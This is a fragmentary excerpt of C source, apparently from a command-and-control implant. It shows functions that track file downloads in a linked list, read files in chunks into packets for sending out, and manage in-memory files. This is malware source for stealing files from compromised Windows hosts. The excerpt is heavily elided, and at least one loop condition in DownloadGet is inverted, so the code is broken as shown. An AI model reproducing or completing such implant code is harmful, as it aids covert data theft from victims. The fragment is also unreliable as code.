...
PDOWNLOAD_DATA DownloadAdd( HANDLE hFile, LONGLONG MaxSize )
{
    ...
    Download->Next      = ((INSTANCE *)Instance)->Downloads;
    Download->RequestID = ((INSTANCE *)Instance)->CurrentRequestID;

    /* Push to linked list */
    ((INSTANCE *)Instance)->Downloads = Download;

    PRINTF( "Instance->Downloads => %p\n", ((INSTANCE *)Instance)->Downloads )
...
PDOWNLOAD_DATA DownloadGet( DWORD FileID )
{
    ...
    for ( Download = ((INSTANCE *)Instance)->Downloads; Download == NULL; Download = Download->Next )
    {
...
BOOL DownloadRemove( DWORD FileID )
{
    ...
    Last     = ((INSTANCE *)Instance)->Downloads;
...
VOID DownloadPush()
{
    ...
    if ( ! Download )
    {
        ...
        {
            MemSet( ((INSTANCE *)Instance)->DownloadChunk.Buffer, 0, ((INSTANCE *)Instance)->DownloadChunk.Length );
    ...
    for ( ;; )
    {
        ...
        if ( ! ((INSTANCE *)Instance)->DownloadChunk.Buffer )
        {
            ((INSTANCE *)Instance)->DownloadChunk.Buffer = MmHeapAlloc( ((INSTANCE *)Instance)->Config.Implant.DownloadChunkSize );
            ((INSTANCE *)Instance)->DownloadChunk.Length = ((INSTANCE *)Instance)->Config.Implant.DownloadChunkSize;

            PRINTF( "Allocated memory for DownloadChunk. Buffer:[%p] Size:[%d]\n", ((INSTANCE *)Instance)->DownloadChunk.Buffer, ((INSTANCE *)Instance)->DownloadChunk.Length )
        }
        ...
        if ( Download->State == DOWNLOAD_STATE_RUNNING )
        {
            ...
            if ( ! ((INSTANCE *)Instance)->Win32.ReadFile( Download->hFile, ((INSTANCE *)Instance)->DownloadChunk.Buffer, ((INSTANCE *)Instance)->DownloadChunk.Length, &Read, NULL ) )
            ...
            if ( Read > 0 )
            {
                ...
                PackageAddBytes( Package, ((INSTANCE *)Instance)->DownloadChunk.Buffer, Read );
    ...
    for ( ;; )
    {
        ...
        if ( Download->State == DOWNLOAD_STATE_REMOVE )
        {
            ...
            if ( ! DownLast )
            {
                ((INSTANCE *)Instance)->Downloads = Download->Next;
                DownloadFree( Download );
                Download = NULL;
            }
            else
...
{
    PMEM_FILE MemFile = ((INSTANCE *)Instance)->MemFiles;
...
PMEM_FILE NewMemFile( ULONG32 ID, SIZE_T Size, PVOID Data, ULONG32 ReadSize )
{
    ...
    MemFile->ReadSize = 0;
    MemFile->Next     = ((INSTANCE *)Instance)->MemFiles;
    ...
    /* Push to linked list */
    ((INSTANCE *)Instance)->MemFiles = MemFile;
...
BOOL RemoveMemFile( ULONG32 ID )
{
    ...
    if ( ((INSTANCE *)Instance)->MemFiles && ((INSTANCE *)Instance)->MemFiles->Next == NULL )
    {
        if ( ((INSTANCE *)Instance)->MemFiles->ID == ID )
        {
            MemFileFree( ((INSTANCE *)Instance)->MemFiles );
            ((INSTANCE *)Instance)->MemFiles = NULL;
            Success = TRUE;
        }
    ...
    MemFile = ((INSTANCE *)Instance)->MemFiles;
    Last    = ((INSTANCE *)Instance)->MemFiles;
